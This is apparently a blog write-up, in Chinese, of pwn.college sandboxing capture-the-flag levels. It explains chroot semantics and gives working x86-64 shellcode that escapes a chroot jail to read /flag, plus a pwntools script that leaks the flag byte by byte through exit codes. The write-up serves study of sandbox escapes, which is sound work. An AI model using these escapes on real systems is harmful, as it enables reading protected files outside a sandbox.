---
title: PWN-College-SandBox-Writeup
date: 2024-09-14 10:46:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - Web
---
# pwn.college

https://pwn.college/system-security/sandboxing/

## 有价值的问题

### 1. chroot & chdir

- chroot
 - sets the kernel's concept of **the root directory** of your process
- chdir
 - sets the kernel's concept of **the current working directory** of your process

###


## level 1

如果在根目录下面执行的话，直接`/challenge/babay flag`即可

`chroot()` changes the meaning of `/` for a process and its children.

`chroot("/tmp/jail")` has two effects:
 - For this process, change the meaning of "/" to mean "/tmp/jail".
    - and everything under that: "/flag" becomes "/tmp/jail/flag"
 - For this process, change "/tmp/jail/.." to go to "tmp/jail"

`chroot("/tmp/jail")` does NOT:
- Close resources that reside outside of the jail.
- `cd(chdir())` into the jail.
- Do anything else ！
- Neither of the effects of `chroot` do anything to previously-open resources.
- change hte current working directory



## level 2

`/challenge/babyjail_level2 ./test < ./shellcode.bin`

```asm
BITS 64

section .data
    filename db '../../../../flag', 0    ; 文件路径需要替换为正确的路径

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start

_start:
    ; open("filename", O_RDONLY)
    xor rax, rax
    mov rax, 2                        ; SYS_open
    lea rdi, [rel filename]
    xor rsi, rsi                      ; O_RDONLY = 0
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall
```

## level 3

注意`open`函数打开的，既有可能是一个文件，也有可能是一个目录。

`/challenge/babyjail_level3 ./ < ./shellcode.bin`

```asm
BITS 64

section .data
    filename db '../../../../flag', 0    ; 文件路径需要替换为正确的路径
    errormessage db 'error', 0

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start

_start:
    ; openat(3, filename, 0, 0)
    xor rdi, rdi
    xor rax, rax
    xor r10, r10
    mov rdi, 3
    xor rdx, rdx
    mov rax, 0x101                    ; SYS_openat
    lea rsi, [rel filename]
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; write(1, buffer, rax)
    lea rsi, [rel errormessage]
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall


    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall


```

## level 4



## level 5

### 系统调用参数

`linkat`的函数原型是：

```c
int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags);
```

- `olddirfd`: 指向旧目录文件描述符（可以是`AT_FDCWD`，表示当前工作目录）。
- `oldpath`: 指向要链接的源路径的指针。
- `newdirfd`: 指向新目录文件描述符（可以是`AT_FDCWD`，表示当前工作目录）。
- `newpath`: 指向目标路径的指针。
- `flags`: 链接时的标志。




## level 6

`fchdir`是一个系统调用，用于更改当前工作目录到由文件描述符指定的目录。与`chdir`不同，`fchdir`是通过一个打开的文件描述符进行操作，而不直接使用路径名。

### 函数原型

```c
int fchdir(int dirfd);
```

### 参数

- `dirfd`: 指向要设置为当前工作目录的目录的文件描述符。这个文件描述符必须是一个有效的目录。如果使用`AT_FDCWD`作为参数，则表示使用当前工作目录。

### 返回值

- 如果成功，返回`0`。
- 如果失败，返回`-1`，并将`errno`设置为表示错误的代码。

## level 7

有些人白痴到把`lea rdi, [rel filename]` 写成了 `mov rdi, [rel filename]`

### 1. `lea rdi, [rel dirname]`

- **功能**：`lea`（Load Effective Address）指令用于加载一个地址（而不是指向该地址的内容）到寄存器中。具体来说，它计算 `dirname` 的地址，并将这个地址存储到 `rdi` 中。
- **用途**：当你需要将一个变量或字符串的地址传递给系统调用或其他指令时，`lea` 是正确的选择。它不会尝试去访问或读取 `dirname` 变量的内容，而是将它的地址直接放到 `rdi` 中。

### 2. `mov rdi, [rel dirname]`

- **功能**：`mov` 指令用于将某个内存地址中的内容加载到寄存器中。在这种情况下，`[rel dirname]` 被解释为从 `dirname` 的内存地址读取内容，并将这个内容放入 `rdi` 中。
- **用途**：这种用法会尝试访问 `dirname` 所指向的内存位置，并将该位置的内容（通常是字符串的首字符的 ASCII 值）放入 `rdi` 中。这通常不是我们想要的，因为在创建目录时，我们需要传递的是目录的地址，而不是其内容。

## level 8

`/challenge/babyjail_level8  < shellcode.bin 3</`



## level 9

又犯了第7关的错误

要注意下x86-64和x86-32两种架构下，系统调用号是不一样的。

```asm
32位：
mov eax, 3    ---(read)
int 0x80

64位：
mov rax, 3   -----(close)
syscall
```


## level 10

学习一下这种编程思路。替换掉TEST的占位，换成响应的地址，然后再汇编。

```python
from pwn import *

flag = ""
for i in range(57):
    p = process(["/challenge/babyjail_level10", "/flag"])
    shellcode = """
        mov rdi, 3
        mov rsi, 0x1337100
        mov rdx, 100
        mov rax, 0
        syscall

        mov rax, 0x3c
        mov rdi, [TEST]
        syscall"""
    # 替换占位符
    shellcode = shellcode.replace("TEST", hex(0x1337100 + i))
    shellcode = asm(shellcode, arch='amd64')
    p.sendline(shellcode)
    p.wait()
    flag += chr(p.returncode)

print(flag)
```

